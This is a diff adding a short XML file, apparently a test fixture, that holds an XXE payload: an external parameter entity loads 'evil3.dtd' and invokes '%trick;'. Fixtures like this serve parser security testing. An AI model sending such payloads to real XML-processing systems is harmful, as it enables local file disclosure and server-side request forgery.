@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "evil3.dtd">
+%remote;
+%trick;
+]>
+<root></root>
